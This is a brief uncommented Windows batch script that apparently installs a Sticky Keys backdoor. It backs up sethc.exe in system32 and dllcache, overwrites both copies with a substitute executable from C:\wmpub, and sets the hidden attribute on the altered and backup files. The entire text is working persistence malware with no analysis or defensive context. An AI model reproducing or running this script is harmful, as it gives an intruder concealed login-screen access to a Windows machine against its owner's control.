@echo off
cls
copy C:\WINDOWS\system32\sethc.exe C:\WINDOWS\system32\sethc1.exe
copy C:\WINDOWS\system32\dllcache\sethc.exe C:\WINDOWS\system32\dllcache\sethc1.exe
copy C:\wmpub\fg.batsethc.exe C:\WINDOWS\system32\sethc.exe
copy C:\wmpub\fg.batsethc.exe C:\WINDOWS\system32\dllcache\sethc.exe
attrib C:\WINDOWS\system32\sethc.exe +h
attrib C:\WINDOWS\system32\dllcache\sethc.exe +h
attrib C:\WINDOWS\system32\sethc1.exe +h
attrib C:\WINDOWS\system32\dllcache\sethc1.exe +h
echo
cls
echo.
cls
